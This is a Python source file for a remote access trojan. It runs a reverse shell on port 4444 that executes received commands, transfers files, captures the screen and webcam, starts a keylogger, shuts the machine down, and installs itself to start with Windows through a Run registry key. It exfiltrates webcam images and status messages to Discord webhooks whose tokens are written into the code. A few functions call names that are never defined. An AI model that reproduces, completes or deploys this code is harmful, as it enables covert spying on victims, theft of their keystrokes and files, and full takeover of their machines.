import socket
import json
import subprocess
import os
import pyautogui
import shutil
import sys
import pygame
import pygame.camera
import time
import random
import threading
import requests
from discord import Webhook, RequestsWebhookAdapter, File


def trojan():
    def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

    def reliable_recv():
        data = ''
        while True:
            try:
                data = data + s.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
        s.settimeout(None)
        f.close()

    def upload_file(file_name):
        f = open(file_name, 'rb')
        s.send(f.read())

    def screenshot():
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save('screen.png')

    def webcamsnap():
        # snap = subprocess.Popen('python webcam-config.py', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        webcam = subprocess.Popen('webcam.exe', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)

        time.sleep(10)

        webhook = Webhook.partial(996591465943810169, 'nVfktaRVkrZoDCbYxNk4ovoAupoUACLwuiNcjey_ZxPNMetIxCjWd1lreCt_Vu8LdOD7', adapter=RequestsWebhookAdapter())
        webhook.send('Webcam-Snapshot', file=File('image.bmp'),username='webcam images')

        os.remove('image.bmp')

    def CYZojsbmOLAXFnyd():
        webhook = Webhook.partial(996442469807947898, '0XdnDwMmGL1ZPmHukCRPTj9i_yQTQ4rYaSpTvYxvskdfhEjGyWXQwLuOAyZNtMdDq5Ks', adapter=RequestsWebhookAdapter())
        webhook.send('Listening Started at Port(4444)', username='naziload')

    def shutdown():
        os.shutdown("shutdown /s /t 1")

    def persist(reg_name, copy_name):
        file_location = os.environ['appdata'] + '\\' + copy_name
        try:
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
                reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
            else:
                reliable_send('[+] Persistence Already Exists')
        except:
            reliable_send('[+] Error Creating Persistence With The Target Machine')

    def startup():
        pass

    def connection():
        while True:
            time.sleep(20)
            try:
                s.connect(('127.0.0.1', 4444))
                shell()
                s.close()
                break
            except:
                connection()

    def shell():
        while True:
            command = reliable_recv()
            if command == 'quit':
                webhook = Webhook.partial(996442469807947898, '0XdnDwMmGL1ZPmHukCRPTj9i_yQTQ4rYaSpTvYxvskdfhEjGyWXQwLuOAyZNtMdDq5Ks', adapter=RequestsWebhookAdapter())
                webhook.send('connection has been break!!!', username='naziload')
                break
            elif command == 'background':
                pass
            elif command == 'help':
                pass
            elif command == 'clear':
                pass
            elif command[:4] == 'cat ':
                filecat = open(command[4:])
                file_data = filecat.read()

                reliable_send(file_data)

                reliable_send(version)
            elif command == 'camlist -n':
                pygame.camera.init()
                camlist = pygame.camera.list_cameras()

                listToStr = ' '.join([str(elem) for elem in camlist])
                reliable_send(listToStr)
            elif command == 'webcam_snap':
                webcamsnap()
            elif command == 'snapshot':
                snapshot()

            elif command == 'username':
                current_user = os.getlogin()
                reliable_send(current_user)

            elif command == 'getcwd':
                cwd = os.getcwd()
                reliable_send(cwd)

            elif command[:3] == 'cd ':
                os.chdir(command[3:])

            elif command[:4] == 'cat ':
                txtfile = open(command[4:], 'r')
                filedata = read(txtfile)
                reliable_send(filedata)

            elif command[:6] == 'upload':
                download_file(command[7:])

            elif command[:8] == 'download':
                upload_file(command[9:])

            elif command[:10] == 'screenshot':
                screenshot()
                upload_file('screen.png')
                os.remove('screen.png')

            elif command[:12] == 'keylog_start':
                keylog = keylogger.Keylogger()
                t = threading.Thread(target=keylog.start)
                t.start()
                reliable_send('[+] Keylogger Started!')

            elif command[:11] == 'keylog_dump':
                logs = keylog.read_logs()
                reliable_send(logs)

            elif command[:11] == 'keylog_stop':
                keylog.self_destruct()
                t.join()
                reliable_send('[+] Keylogger Stopped!')

            elif command[:11] == 'persistence':
                reg_name, copy_name = command[12:].split(' ')
                persist(reg_name, copy_name)

            elif command == 'shutdown':
                shutdown()

            elif command[:7] == 'sendall':
                subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
            else:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CYZojsbmOLAXFnyd()
    connection()


t1 = threading.Thread(target=trojan)
t1.start()
